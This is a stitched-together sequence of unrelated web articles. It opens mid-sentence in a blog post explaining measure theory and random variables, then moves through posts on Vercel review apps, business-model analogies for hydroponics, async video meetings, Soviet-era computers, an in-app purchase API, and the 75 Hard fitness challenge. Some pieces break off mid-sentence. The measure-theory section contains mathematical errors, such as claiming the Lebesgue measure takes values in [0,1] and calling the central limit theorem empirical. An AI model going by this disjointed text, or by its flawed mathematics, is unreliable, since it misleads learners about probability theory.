the Wikipedia article is very apt here.</p>
<blockquote>
<p><strong>Measure on a Set is a systematic way to assign a real number to each suitable subset of a set.</strong></p>
</blockquote>
<p><strong>Measurable Events:</strong> We can group those set of events that can be measured or quantified by using some units that we are familiar with.</p>
<p><img alt="MeasureTheory" src="https://haridas.in/images/RandomVariable-Measure_theory.png"></p>
<p>Here <code>Set A</code> can be anything ( eg; all people in the world, space in physics, number of atoms in the universe ), that we are trying to understand. Power Set of <code>Set A</code> includes all elements in <code>Set A</code> as well as all combinations of items in <code>Set A</code> including the <code>null</code> item.</p>
<p>Assigning a real number to all these subsets of A is called <strong>Measuring</strong>. We can do any type of measuring activity that is possible on the <code>Set A</code> or the measuring that's important to us. For example, to understand the heights of all humans in the globe, we do Measure their height, here the measuring is finding the height of each and every person and map that to a real line with some unit.</p>
<p>I was wondering, why the Measure was defined like this, why the intermediate set ( power set of <code>A</code> ) required here ?, why note map the initial set A to the real number? What I'm able to reason here for these questions are,</p>
<ol>
<li>Power set includes the <code>set A</code> also</li>
<li>It takes care of the cases where the original set is not fully tractable or impossible to find all the items in it, so we have to measure things that are available for us, so there the subset makes sense as a framework.</li>
<li>In the case of non-discrete space eg; length, volume, temperature, etc, it's impossible to get the exact value, hence ranges are used or subsets here.</li>
</ol>
<h3>σ-algebra ( Sigma Algebra )</h3>
<p>An <code>Algebra</code> on a Set is a collection of subsets closed under Union and Intersections.</p>
<p>An <code>σ-Algebra</code> on a Set is a collection of subsets closed under countable unions and Intersections.</p>
<p>What's mean by <strong>closed</strong> is that, if we take any two items from the given set and we do the specified operation (union or intersection), the result also available in the same Set.</p>
<p>The <code>Countable</code> union or intersection means, we can associate natural numbers to the subsets of a given set, ie; a bijective nature in the mapping. Another side of it is, all the subsets are not measurable, as it wouldn't follow the constraints of σ-algebra, Hence σ-algebra is a special constraint applied on a Set to define the Measure and Measure space.</p>
<p><img alt="CountableAddictivity" src="https://haridas.in/images/Countable_additivity_of_a_measure.svg.png"></p>
<p> [Source: Wikipedia] </p>

<p>Note: Here <span>\(\mu\)</span> is a <strong>Measure</strong>.</p>
<h3>Different Types of Measures</h3>
<p>Based on some constraints applied on how we can do the measuring or what to measure we can group the Measuring to different types of measures that are common for a particular domain,</p>
<ol>
<li><strong>Borel Measure</strong>: Allocate real number to space.</li>
<li><strong>Lebesgue Measure</strong>: Standard way to measure the n-dimensional euclidean space. This measure is a more general one and used to formalize the probability space also. As in that case, the measure assigns values in the range of [0, 1].</li>
<li><strong>Counting Measure</strong>: Counts the number of items in a subset of <code>Set A</code></li>
<li>etc.</li>
</ol>
<h3>Measure Space</h3>
<p>Measure space is defined using a triplet - <span>\((X, A, \mu)\)</span>, Here</p>
<ol>
<li><span>\(X\)</span> is the Set</li>
<li><span>\(A\)</span> <span>\(\sigma\)</span>-algebra defined on the Set X, or the subset follows the constraints of <span>\(\sigma\)</span>-algebra.</li>
<li><span>\(\mu\)</span> is the measure</li>
</ol>
<p>This abstract notion helps to understand the entire Measure space and its characteristics.</p>
<ol>
<li><strong>Euclidian space</strong> - Try to measure the Length, Area, Volume, hypervolume, etc. Or more common 3-D space.</li>
<li><strong>Probability Space</strong> - In this case, the Measure of an entire Set is 1. And <code>null</code> set gets value zero -- We can say this space is an abstract space, with some special properties attached to it. This is being done by proper normalization or knowing about all subsets in the measure space.</li>
<li>etc.</li>
</ol>
<p>Probability Space also formally defined by the triplet same as above, but the elements are named differently, as,</p>
<p>Probability space triplet - <span>\((\Omega, F, P)\)</span></p>
<ol>
<li><span>\(\Omega\)</span> - All possible outcomes of an experiment or <code>Sample Space</code>,</li>
<li><span>\(F\)</span> - Subsets of <span>\(\Omega\)</span> called as <code>Event Space</code>, each subset is called an <code>event</code>. We can call the <span>\(F\)</span> set of all events from sample space.</li>
<li><span>\(P\)</span> - Probability function, which assigns a real number between [0-1] to every  <code>event</code>.</li>
</ol>
<p>Here you will be wondering how the probability function ensures the mapping is between 0-1 ?, this is being ensured by the proper normalization factor, if the sample space <span>\(\Omega\)</span> is fully tractable, then that can be used, or only approximation works there.</p>
<p>Why <span>\(P(\Omega) = 1\)</span>, this can be explained by applying the rule of <span>\(\sigma\)</span>-algebra, the functions should support, <strong>countable union</strong>,</p>
<p><span>\(P(\Omega) = P(O_1) + P(O_2) + ... + P(O_n) = 1\)</span></p>
<h2>Random Variable</h2>
<p>Now we all already covered what's Random variable multiple times above, let’s restate it here,</p>
<blockquote>
<p><strong>A random variable is not a variable but a function that maps from space to the real number domain.</strong> So we can see that Random Variable is a measure done on a specified Measure Space.</p>
</blockquote>
<p>So it's clear that we can pick, any measurable function as a random variable. Few constraints applied there are</p>
<ol>
<li>Whether that measurable function is usable to us.</li>
<li>We can do the measure on the given Space.</li>
</ol>
<p>If we are dealing with the probabilities of outcomes of an event, then we can represent this entire experiment using the <code>probability space</code> definition.</p>
<h5>Q: So what's <strong>Random</strong> in Random Variable?</h5>
<p>A: Only thing here random being important is, at measure time we shouldn't be biased on any specific type of subsets for measuring. So the <strong>process</strong> of measuring has randomness, hence we call this a random variable.</p>
<p>Let's take one example experiment, where we consider all humans as our <strong>Measure Space</strong></p>
<h2>Probability Distributions</h2>
<blockquote>
<p>From Wikipedia, Probability Distribution is a mathematical description ( or summary) of probabilities of events, subsets of the sample space. These descriptions are represented as a function.</p>
<p>Putting it in another way: Probability Distribution is a function that gives probabilities of occurrence of different possible outcomes for an Experiment.</p>
</blockquote>
<p>IMO, This idea came because, after seeing different probability spaces ( or outcomes of different experiments ) we were observed surprisingly have a common pattern. From this, we have an abstract meta function that describes the behaviors of a <strong>random variable</strong>.</p>
<p>The Normal Distribution ( Bell curve ), seems to be a common pattern we see for a lot of Random Variables that we pick, If a particular Random Variable follows a pattern of particular distribution, then we call it as normally distributed Random Variable. There are a lot of different types of distributions present based on the different characteristics of the Random Variable. In which the Normal Distribution seems to be a universal standard behavior across the board.</p>
<p>There are two key principles around this,</p>
<p>Let's explain this using a simple measure experiment - <strong>Measure height of people across the globe</strong></p>
<p>The measuring process is shown below, </p>
<p><img alt="MeasurePeopleHeight" src="https://haridas.in/images/RandomVariable-HeightRandomVariable.png"></p>
<p>It's not humanly possible to measure all 7+ Billion people's height to get an idea about how it distributed. So this will be done by taking samples randomly from different locations, and repeat this process till we feel the measure is consistent enough or showing convergence properties. ie; the overall properties of the measure ( probability distribution ) isn't changing considerably after N ( finite sample ) measures.</p>
<h4>1. Central Limit Theory ( CLT )</h4>
<blockquote>
<p>An <strong>Average</strong> of Random Variable's distribution tend towards Normal Distribution ( Bell curve ) if we do measure/sample an infinite number of times.</p>
</blockquote>
<p>This observation comes empirically. The averaging operation actually bringing the distributions of different independent and identically distributed (i.i.d.) random variables centered around the global average or Population Average. This is where the CLT has some relation to the Law of Large Number discussed below, which covers the Expected Value of a Random Variable will be stabilized when we sample/measure enough number of time from the event space.</p>
<h4>2. Law of Large Number</h4>
<blockquote>
<p>Sample Mean converges to the population mean.</p>
<p>Sample Mean is the set of events we have measured ie; Random Variables.</p>
</blockquote>
<p>In the above measure of height, we can consider there is an unknown population mean <span>\(\mu\)</span> and population standard deviation <span>\(\sigma\)</span>. We are doing this measure to find this population mean and variance or other properties of the height (<span>\(H\)</span>) random variable. So from the event space, we randomly pick N number of people and measure the height, ( N maybe 1000, or 1Million or so ).</p>
<p>I have discussed the Law of Large Number in another blog post also - <a href="https://haridas.in/expected-value-of-lottery-ticket.html">Expected Value of a Lottery</a></p>

Ever since I read <a href="https://amzn.to/39B0EQ7" target="_blank" rel="noopener">Product Development for the Lean Enterprise</a> many years ago, I can't help but see the process of software development as one big assembly line that needs to be constantly evaluated and optimized.</p><p>How quickly can we start a new project?</p><p>How quickly can we iterate on UI during local development?</p><p><strong>How long does it take to get feedback from your team?</strong></p><p>This last question is where <strong>review apps</strong> are incredibly powerful, so much so that <em>I can't live without them</em>.</p><h2 id="what-are-review-apps">What are review apps?<a href="#what-are-review-apps">#</a></h2><p>Review apps, sometimes referred to as "previews" or "deploy previews" are ephemeral versions of an application, typically deployed from a branch on GitHub or another version control system.</p><p><img src="https://seanconnolly.dev/img/review-applications/review-app.png" alt="Review app"></p><p>Some links in this post are to affiliate sites.

In my opinion, <a href="https://vercel.com/" target="_blank" rel="noopener">Vercel</a> has the most elegant solution for review apps (they call them previews) so we will look at their solution more closely. Vercel designed their system from the ground up to support previews, hence why you see <code>Deploy. Preview. Ship.</code> in massive font on their home screen. Heroku, on the other hand, added their review apps to an existing system so their solution does feel a bit more shoe-horned and complicated. In either the case, the same principles apply.</p><h3 id="enabling-review-apps-in-version-control">Enabling review apps in version control<a href="#enabling-review-apps-in-version-control">#</a></h3><p>Vercel previews are enabled by default when you enable the <a href="https://vercel.com/github" target="_blank" rel="noopener">Vercel GitHub integration</a>.</p><p>Below is a screenshot of the GitHub integration settings for the GitHub project that powers the site that you are on right now, seanconnolly.dev.</p><p><img src="https://seanconnolly.dev/img/review-applications/vercel-github.png" alt="Vercel GitHub"></p><p>After I write this sentence, I am going to pause writing to commit and push my changes to GitHub so you can see what this blog post looks like as a Vercel preview.</p><p>Below is a screenshot of what my VS Code IDE looks like right now. In the bottom right, I have a terminal open where I am about to commit my changes and push to GitHub.</p><p><img src="https://seanconnolly.dev/img/review-applications/vscode-screenshot.png" alt="VS Code screenshot"></p><p>In GitHub, I created a pull request for my current branch. With the Vercel GitHub integration enabled, I am able to see this convenient "View deployment" link.</p><p><img src="https://seanconnolly.dev/img/review-applications/view-deployment.png" alt="View deployment"></p><p>Clicking the "View deployment" link navigates me to <a href="https://seanconnolly-r0nt71a73.vercel.app/" target="_blank" rel="noopener">https://seanconnolly-r0nt71a73.vercel.app/</a>, the URL for the preview. If you click the "Why I can't live without review apps" heading, it will take you to the earlier version of the blog post you are reading, including my TODO reminders and probably some typos 😛.</p><h2 id="review-apps-with-backend-services-and-apis">Review apps with backend services and APIs<a href="#review-apps-with-backend-services-and-apis">#</a></h2><p>Review apps work best when the frontend of your application is state<em>less</em>, meaning it doesn't ship with a tightly coupled state<em>ful</em> data store.</p><p>If you did include a data store with your application, anytime you created a review app, meaning a new version of your application, you would also need to copy some or all of the data store. This can be a time-consuming and costly endeavour, depending on the size of your data. There are many other reasons to keep your frontend stateless, and in some cases, like with mobile apps, your frontend is stateless by design. In any case, because <em>I can't live without review apps</em>, I always work with stateless frontend applications.</p><p><strong>So, how do we interface with backend services and APIs?</strong></p><p>There are a number of ways to structure your environments to work with review apps, but my environments normally look like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/review-app-envs.png" alt="Review app environments"></p><p>This is for the smallest use case. With larger team projects, there could be multiple static environments like development, staging, test, etc. and those may also have their own backend APIs. The point here is that your review apps are not expected to have their own copies of your data store and API. Instead they piggyback off of an existing data store that you are already using.</p><h2 id="review-apps-with-automated-tests">Review apps with automated tests<a href="#review-apps-with-automated-tests">#</a></h2><p>Automated test frameworks like <a href="https://cypress.io/" target="_blank" rel="noopener">Cypress</a> allow you to run your tests against a specific URL. Often you will run these tests locally by pointing Cypress to a localhost URL like <code>http://localhost:3000</code>. You can also run your tests against your production environment or another static environment like dev or staging. With Cypress you can set the <code>CYPRESS_baseUrl</code> environment variable to dynamically run your tests against a review app, which as we saw before has a dynamically generated, unique URL. I'll skip the gory details of how we do this in CircleCI, our continuous integration tool, but effectively our Cypress run command looks like this:</p><pre><code><span>CYPRESS_baseUrl</span><span>=</span><span>"https://seanconnolly-r0nt71a73.vercel.app/"</span> <span>npm</span> run cypress
</code></pre><p>While there are many ways to run Cypress in CircleCI and other continuous integration tools, our goal is to run our automated tests in an environment <strong>as close to the production environment as possible</strong> and we find review apps are the best way to do that.</p><h2 id="review-apps-for-teams">Review apps for teams<a href="#review-apps-for-teams">#</a></h2><p>Review apps really shine with cross-functional teams. My team's Clubhouse stories usually look something like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/clubhouse.png" alt="Clubhouse story"></p><p>And our team workflow has these steps:</p><ul><li>Ready for Review</li><li>Ready for QA</li><li>Ready for Design Review</li><li>Ready for Product Review</li></ul><p>(I removed a few other steps that aren't relevant to this post)</p><p>That's a lot of reviews! At each stage, a teammate has an easy way to access the review app and verify whatever they need to.</p><p>In <strong>Ready for Review</strong>, other developers can pull up the review app to check certain types of functionality or to confirm whether or not the code they are reviewing actually results in some kind of defect or odd user behavior. Without review apps, reviewers would need to pull down the branch and run it locally, which is fine, but in my experience is more effort than people care to go through so they often just don't do it.</p><p><strong>Ready for QA</strong> is the most necessary use of review apps for us. QA engineers perform almost all of their tests on review apps. This is also the area where we see the most iteration cycles. When QA finds a bug, the developer needs to track it down locally and then push those changes to their branch, resulting in a new deployment for QA to re-test.</p><p><strong>Ready for Design Review</strong> is applicable when working on larger new features or making significant design changes. Designers don't usually go through the steps to run the app locally so I've often seen teams ship their work to production or a shared development environment in order to get design feedback. Review apps allow design iteration to happen before code gets merged with the main project.</p><p><strong>Ready for Product Review</strong> is where product owners decide whether or not a feature is ready to go to production. Like designers and QA engineers, they benefit from having easy access to the application in a near-exact replica of production before the feature is exposed to real users.</p><p>Though your team may not follow all of these steps in the exact same way, hopefully you can see how many members of your team can benefit from review apps.</p><h2 id="review-apps-for-indie-hackers">Review apps for indie hackers?<a href="#review-apps-for-indie-hackers">#</a></h2><p>When I say <em>I can't live without review apps</em>, I mean it. Even in small projects where I am the only developer, I use review apps extensively. Even with this blog, there are plenty of use cases where review apps come in handy.</p><p>As a member of the <a href="https://bloggingfordevs.com/" target="_blank" rel="noopener">Blogging for Devs</a> community, I am constantly posting review app links in the community to get feedback on my posts before they are exposed to readers and search engines.</p><p>I also participate in community writing programs where I am writing on behalf of companies like LogRocket and Fauna. Their editorial process is more rigorous and I find it most effective to share the review app version of the post that I plan on publishing because it is the most realistic preview I can provide to editors.</p><p>Also, my blog is a side project. I often work on cosmetic or structural changes to the site and I like to be able to test it across multiple devices and browsers without much fuss. The easiest way for me to test things is to push to a branch and open the review app link wherever I want to test. Redeploying to review apps is as easy as running <code>git commit -am "Fixing mobile issue" &amp;&amp; git push</code>, waiting just a minute and refreshing.</p><h2 id="what-review-apps-mean-for-production-deployments">What review apps mean for production deployments<a href="#what-review-apps-mean-for-production-deployments">#</a></h2><p>By adding review apps to your development workflow, production deployments become substantially safer and faster.</p><p>For smaller projects, as soon as I confirm my changes look good in my review app and my automated tests pass, I will merge to master/main and walk away knowing production will be updated momentarily.</p><p>For projects with a larger team, a lot of verification happens before merging to master/main so by the time a branch is ready to go to production, there is a <em>very</em> small chance that anything goes wrong in our continuous deployment pipeline. That said, I generally err on the side of caution when working with products that real people are actively using and paying for so I advocate for running automated tests again and also including some manual verification steps.</p><p>If you are inclined, you can also incorporate review apps into your continuous deployment process where your workflow looks more like this:</p><p><img src="https://seanconnolly.dev/img/review-applications/prod-review-app.png" alt="Production review app"></p><ol><li>This is production steady state where the production domain points to the current version of your app.</li><li>Next, the review app is deployed but only accessible via its unique URL. You can use this for automated testing, manual …</li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Analogies are everywhere. Take from different fields to increase your perception of your own field.</p>
<p>I recently talked to a company growing and selling in-home hydroponic kits to grow crops in an apartment in the city for example, where most people do not have gardens like in suburbia. Given my experience in the startup world as well as in technology, I thought of their idea for some time and realized that there are quite a few business models that they can go towards, as they had the tech but didn't know how to progress it into an actual business.</p>
<p>Here's the list I came up with:</p>
<ul>
<li><strong>Infrastructure as a Service (IaaS)</strong> - Selling access to the infrastructure (but not the infrastructure itself) with which customers can then do whatever they want
<ul>
<li>Sell access to hydroponics kits (kits) for individuals, restaurants, companies (groups) to grow their own crops, but they have to maintain it themselves</li>
</ul>
</li>
<li><strong>Platform as a Service (PaaS)</strong> - Selling infrastructure with less control over the details but more ease of use for customers
<ul>
<li>Sell access to kits with certain crops already available, and groups can pick what they want to grow, and perhaps customize the crops and crop choice</li>
<li><em>Serverless</em> - Grow crops on demand based on needed capacity</li>
</ul>
</li>
<li><strong>Software as a Service (SaaS)</strong> - Selling access to the product without selling the infrastructure itself to run the product
<ul>
<li>Sell the crops themselves to groups so that they don't need to grow crops themselves</li>
<li>Boutique grocery stores</li>
<li>Delivery of crops on a regular basis</li>
<li>Delivery of meal kits on a regular basis with additional included groceries such as pasta or rice</li>
</ul>
</li>
<li><strong>Desktop as a Service (DaaS)</strong> - Sell remote access to the product
<ul>
<li>Monitor crops from anywhere with a web app or mobile app. The app could show crop yields, stats, expected time to delivery, expected time to expiration, et cetera</li>
<li>Complementary to the other models, not a replacement</li>
</ul>
</li>
<li><strong>On-premise</strong> - Sell the product to be deployed directly on the property of the customer, and sometimes maintain it for them
<ul>
<li>Grow the crops on the premises of the groups and maintain it for them</li>
</ul>
</li>
<li><strong>Self Service</strong> - Selling the infrastructure itself, not just access to it
<ul>
<li>Sell the kits themselves</li>
</ul>
</li>
<li><strong>Distributed Computing</strong> - Selling where the product usage occurs, oftentimes taking a percentage of every sale
<ul>
<li>Allow other people to grow crops and sell them locally</li>
<li>The crowdsourced Uber/Airbnb model</li>
</ul>
</li>
</ul>
<p>This list came up due to my experience in business and technology, but if I had expertise in other fields, then this list would've been different. Learn from different domains and create analogies between them to think of new ideas and combinations of those ideas.</p>

<p><span>The world has changed and nothing will be the same: Companies all around the world are shifting to remote work, employees have been adopting new work habits for more than 8 months now. So let’s be honest, employees won’t return to the office as before. Remote work is no longer a temporary situation. You have to create your future environment of work right now because it’s the new norm.&nbsp;</span></p>
<p><span>So when companies shift suddenly from a 100% office environment to a home environment, what do they do? They shift all their in person meetings to video meetings! Really?? Some even double down on it to be sure their employees are working!!</span></p>
<p><span>What happened? Zoom fatigue became the new popular hashtag and people were less productive and less engaged. And we are not talking about “Zoom bombing”!</span></p>
<p><span>I think we have to completely reinvent the way of working, communicating, collaborating and learning in this new world and not just duplicate what we do in person in a digital form.</span></p>
<p><strong>I BELIEVE THAT THE FUTURE OF WORK IS ASYNC VIDEO COMMUNICATION.</strong></p>
<p><span>Async video meetings are all about optimizing your team’s time, and they are a great way to get information in front of people who don’t have availability for a meeting, or who are working remotely across multiple time zones. When you work in the way I do,having time to think on and internalize information before acting is critical.</span></p>
<p><span>Instead of coordinating schedules, opt to send a quick async video with key info that your remote colleagues can view during normal work hours.</span></p>
<p><span>Asynchronous communication allows people to first absorb and then act on information when they are able to, rather than the moment a piece of information is put in front of them.&nbsp;</span></p>
<p><span>Here are my 5 beliefs to embrace this new world&nbsp; :&nbsp;</span></p>
</div></div></div></div>


<div><div><div><p><h2>1. The remote worker is FREE, completely FREE</h2></p></div></div></div>


<div><div><div><div><p><span>Your employees are working remotely, they decide where and when. They are working from their personal environment, so you don’t oversee how they want to manage their time and where they can or want work. You don’t offer them a work environment anymore so you have to admit that you also lost this power.</span></p>
<p><span>If an employee wants to work from 5am and go hiking or kayaking by 2pm, he can do that!! Why not? Trust me, he will be much more productive.&nbsp;</span></p>
<p><span>Let’s talk about children: When you are working from home, you are sharing the same family space and property. You cannot ask them everyday “Please be quiet, Iwill be on a zoom meeting.”</span></p>
<p><span>Seriously!! I am sure this generation will hate zoom meetings. They are synonyms to online school and now“mom and dad are not available”! You are physically here but not really here, it’s difficult for our loved ones. We need to take that in consideration and not impose our timing on others.&nbsp;</span></p>
<p><span>I encourage your people to work the hours that suit them and their lives, in the middle of what is a stressful time for everyone.</span></p>
<p><span>I think we need to be more respectful of each other’s time and not interrupt with alive meeting each time we need it.&nbsp;</span></p>
<p><span>We need to be more respectful of each others’ home life: We enter each other’s personal space. It’s why weet captures a small portion of your background and you can even blur it.</span></p>
</div></div></div></div>


<div><div><div><p><h2>2. The remote worker is MORE PRODUCTIVE</h2></p></div></div></div>


<div><div><div><div><p><span>With asynchronous communication you allow yourself – or your employees – to put all energy into what you do each time and have better control over your workload.</span></p>
<p><span>In workplaces where asynchronous collaboration is reinforced and enabled with technology, productivity is higher. People can follow their agenda and complete daily tasks more easily when they are able respond to their colleagues’ requests based on bandwidth or set up time slots throughout the week to prepare feedback for specific projects. Plus, by focusing their attention on one task at a time they have a more detailed look and bring in better results.</span></p>
</div></div></div></div>


<div><div><div><p><h2>3. Working remotely = HUMAN &amp; EMOTION</h2></p></div></div></div>


<div><div><div><div><p><span>It’s important to keep a human and emotional connection with our team and clients even if we cannot see them in person. I personally attach great importance to emotional communication where I can see facial expressions, hear a warm voice, and feel others’ mood.&nbsp;</span></p>
<p><span>A lot can be lost in translation in writing, including empathy, body and facial language, and often the attention of the reader when it’s a long note.</span></p>
<p><span>Async videos accomplish a number of things that emails or text chat cannot. They create more of a human connection, which makes it easier to understand each other and makes it clear to the recipient that the ideas being shared are well understood. Async meetings are ideal for giving feedback, because empathy comes through much more clearly when you can see face-to-face or hear a warm voice.</span></p>
<p><span>You’ll be surprised by the power of emojis in a video or just how a voice tonality can say a lot!&nbsp;</span></p>
<p><span>Every person is different and some are not comfortable with the camera. For this reason, we offer the capability to&nbsp; record without the camera but we always show a profile picture in all the videos: It’s a good way to keep a human connection.</span></p>
<p><span>And Weet offers the ability to add filters on your webcam to create a fun environment&nbsp; and make your teammates smile 😉</span></p>
<p><span>We also discovered that&nbsp; async video gives a voice to those who are quieter. Contributing to live meetings can often rely on speaking skills of speed and volume, while async videos let people share their thoughts at their own pace.</span></p>
<p><span>While some people prefer reacting spontaneously others need time to think and video recordings accommodate both approaches to produce a clear “leave-behind” that allows everyone to review feedback at their own speed. </span></p>
</div></div></div></div>


<div><div><div><p><h2>4. STOP CHAT &amp; LONG MEETINGS</h2></p></div></div></div>


<div><div><div><div><p><span>Working remotely equals working alone. It can be difficult to motivate yourself to concentrate.&nbsp;</span></p>
<p><span>Have you ever found it difficult to concentrate on your daily job duties after being interrupted by an unexpected casual chit-chat about a project your colleague is working on? It’s fine if this happens sometimes because mutual support and camaraderie is a critical part of being a team. But what if it interferes with your productivity?</span></p>
<p><span>Avoid being interrupted and interrupted for just asking a question.&nbsp; Divide your time between working time and communicating time.</span></p>
<p><a href="https://blog.doist.com/asynchronous-communication/"><span>Recent research</span></a><span> has shown that we live in a more collaborative era; We schedule our working day around meetings, Slack conversations and emails with our colleagues and sometimes these events could take up </span><a href="https://hbr.org/2016/01/collaborative-overload"><span>80% of a full working day</span></a><span>:&nbsp;</span></p>
<p><span>This can be detrimental to our performance; Technically we spend more time hopping from one meeting to another or replying to messages than focusing solely and mindfully on our tasks.</span></p>
<p><span>For example, I shut down all my notifications and connect only 4 times in the day to check my emails and my weets. What is great is that if someone needs to ask me a question and would need to do it in a live meeting, he can record it and I answer when I am available. You cannot imagine the freedom that it gives me and above all, the time I gain!&nbsp;</span></p>
<p><span>Why async video meetings are so effective : We talk faster than we type and we retain more information when delivery is via video. Plus people can review recorded videos at their own convenience.</span></p>
<p><span>I want to make a clarification : I am not saying to cut off all the live meetings (at least 2/3) but for those that are necessary, put 30min max in your agenda settings. It seems sometimes too short but you will see people will accomodate.</span></p>
</div></div></div></div>





<div><div><div><div><p><span>2020 has been a challenging year, no doubt. But one thing is clear – the way we have adapted will inform how we work for years to come, empowering us all to do the best work of our lives. Allowing people to work at a time and a pace that suits them is key to this.</span></p>
<p><span>In this new remote world, we can hire anywhere in the globe. Embracing async collaboration allows companies to access a wider range of candidates and freelancers all around the world;</span></p>
</div></div></div></div>





<div><div><div><div><p><b>5 tips to embrace async video meetings :&nbsp;</b></p>
<p><span>1- the most important: Emphasize trust, organization &amp; independence: Evaluate people based on their results, not the number of hours spent online or number of emails.</span></p>
<p><span>2 – Be cool with the video as a media: Not everyone is comfortable with a camera, communicate that it’s ok to cut off the webcam. You are not looking for perfection, just authenticity; Your employees can record their video as they talk in a real conversation.</span></p>
<p><span>3 – Create an async culture mindset: Explain how it works, share the benefits, share some examples and ask top management to begin by creating some enthusiastic video messages and above all, share that in async communication, we don’t wait for an immediate answer.</span></p>
<p><span>4 – Ask your employees and teammates for feedback: Does it work? What are their feelings?&nbsp;</span></p>
<p><span>5 – Minimize the number of meetings you have, but don’t blacklist them.&nbsp; The async work communication stack looks something like this:</span></p>
<p><span>80% async video </span></p>
<p><span>15% live video meetings </span></p>
<p><span>5% physical meetings, e.g., annual company or team retreats</span></p>

<!-- WP QUADS Content Ad Plugin v. 2.0.17.1 -->


<p>Despite the twilight, the floor remained lifelessly dark. Somewhere in the depths, there was a dim glow of electric light, hardly penetrating through old glass blocks.</p>
<p>Inside the floor was empty and black, but not completely.&nbsp;Inside burned several fluorescent lamps, spotlighting dozens of silhouettes of tall cabinets.</p>
<p>Some of them were covered with darkened translucent film.</p>
<p>The surface of the floor, tables and enclosures covered with black spots of soot, sometimes diluted with white stains of dried extinguishing mixture.</p>
<p>The air felt a persistent, but not strong smell of burning.&nbsp;The fire walked here a few years ago but did not touch the equipment.</p>
<p>Part of the cabinets were antique electronic computers. Others served to measure signals, and computers controlled this process. Dozens of terminals froze on the tables with extinct screens.</p>

<p>Suddenly it became clear that before them the legendary machine “Saratov-2”.&nbsp;The machine, which was massively placed on many enterprises of the Soviet Union in the 70s, but at the same time, not a single high-quality (I’m not talking about color) photos remained. Not on the Internet, not even in the museum of the enterprise developer.</p>

<p>This computer did not even have a traditional microprocessor. Domestic clone of the popular American PDP-8, Saratov-2 was produced in two versions.</p>
<p>Steel frame, like a chest of drawers, filled with drawers.&nbsp;Different boxes responded to various computer nodes — a twelve-bit computing unit, input-output device interfaces, and RAM.</p>
<p>The memory was ferromagnetic – two boxes of four cubes in each. Reading or writing programs occurred through punched tapes, and to display the results of calculations used electric typewriter CONSUL-260.</p>
<p>The monitor and keyboard in that era were not yet a much-needed</p>
<p>part of the computer. The necessary input of programs into the operative memory was carried out in binary codes, manually using a group of switches on the front panel. Bulbs controlled the correctness of the input.</p>

<p>The next generation of computers was Electronics 100/25. These machines were clones of American PDP-11.</p>
<p>They thought faster, had more memory, allowed them to work with magnetic tape drives and punched tapes, but the general principle remained the same.</p>
<p>It was possible to connect a monitor and a keyboard to this computer, while still having the ability to enter programs through the front switches.</p>

<p>Electronics-60 – the further development of Electronics 100/25. The same architecture, but bulky tape drives are a thing of the past.</p>
<p>They were replaced by flexible eight-inch floppy disks. The new chipset, allowed to fit the processor module, power supply and control devices, in a very compact size.</p>
<p>I note that all these computers were managers, that is, they worked with a bunch of external equipment. It could be machine tools, laboratory complexes, measuring devices.</p>

<p>15VM16-1 some early version of Electronics-60, having a control panel of light bulbs and switches. Assembled on the element base of the previous Electronics 100/25. I occupied a small nightstand built into the table on which the controlled equipment was placed.</p>

<p>DVK-2M or Interactive Computing Complex. Massive, stylish in appearance, the computer of the 80s, which could be considered a personal computer.</p>
<p>It consisted of two desktop blocks – processor and pairing. A set of interchangeable interface cards allowed connecting drives of various types, a monochrome monitor on an openwork leg, and a keyboard.</p>
<p>Back in 1993, when we were studying, one teaching DVK could distribute programs for a couple of dozen Spectrums through the network.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In-App Purchases (IAP) allow you to build customized purchase experiences for your apps. Using our dead-simple JavaScript API you can ask the user to make purchases dynamically based on your own requirements.</p>
<h2>Adding In-App Products</h2>
<p>To enable IAPs in your app, first, you need to define at least one In-App Product for your app,</p>
<ol>
<li>Go to your <a href="https://www.outpan.com/dev/apps">Developer Dashboard</a>.</li>
<li>Choose the app you would like to enable In-App Purchases for.</li>
<li>From the dashboard page for the selected app, choose <strong>In-App Products</strong>. </li>
<li>Select <strong>New Product</strong> and enter your product's <strong>Name</strong>, <strong>SKU</strong>, and <strong>Price</strong>. Then select <strong>Add Product</strong>.</li>
</ol>
<h2>In-App Purchases in your app</h2>
<ol>
<li>
<p>Add the Outpan JS library to the <code>&lt;head&gt;</code> element of your HTML:</p>
<pre><code>&lt;script type="text/javascript" src="https://js.outpan.com/v1/"&gt;&lt;/script&gt;</code></pre>
</li>
<li>
<p>At the desired point in your application, call the <code>OPRequestPayment</code> function to ask for payment from the user:</p>
<pre><code>OPRequestPayment('SKU-0001', function(resp){
  if(resp.success)
    alert('Payment succeeded.');
  else
    alert('Payment failed.');
});</code></pre>
</li>
</ol></div></div>]]>

<p>Early in September this year I saw a <a href="https://twitter.com/heydannymiranda/status/1298722884332879876?s=20" target="_blank" rel="noreferrer noopener">tweet </a>by Danny Miranda talking about a mental toughness challenge. That was the first time I heard about <em><a href="https://andyfrisella.com/pages/75hard-info" target="_blank" rel="noreferrer noopener">75 Hard.</a></em></p>



<p>In order to complete the challenge in question you had to follow these 5 rules for 75 days straight: 1) do two 45-minute workouts, 2) drink 1 gallon of water, 3) follow a diet, 4) read 10 pages of a non-fiction book and 5) not drink any alcohol.</p>



<p>After a couple of days of hesitation, I decided to join a group of people who were starting the challenge on the same date.</p>



<p>Today’s my last day doing the program.</p>



<p>I’ll be 100% honest with you and admit that there were a couple of days where I fell asleep before finishing the reading or ate a food that I didn’t know had sugar (my only diet rule was to avoid all foods or ingredients with added sugar).</p>



<p>But besides that, I didn’t miss a single workout, I drank a LOT of water and I didn’t drink any alcohol. Also, I did my reading and stuck to my diet more than 90% of the time.</p>



<p>So whether I fully completed the program or not doesn’t really matter – I still did something very hard and I’m proud of myself.</p>



<p>This experience also taught me two great lessons.</p>



<p>First, that you should have your own set of personal rules. And second, that one of your rules should be to always try to do hard shit.</p>



<p>Let me explain.</p>



<p>It might sound counterintuitive, but having your own personal constraints gives you freedom. If you have a rule that you don’t do X, then there’s nothing to even consider. You just don’t do it.</p>



<p>Little by little, you start becoming the kind of person that never does X. This change in your identity, in turn, reinforces the rule and makes it harder to break it in the future. It’s a virtuous cycle. And one of the keys to building long-term habits.</p>



<p>On the other hand, pushing yourself to always do hard things is a recipe for massive growth.</p>



<p>Of course, you might probably find yourself struggling very often too. But, in return, you will develop two of the most important skills a person can have: optimism and resilience.</p>



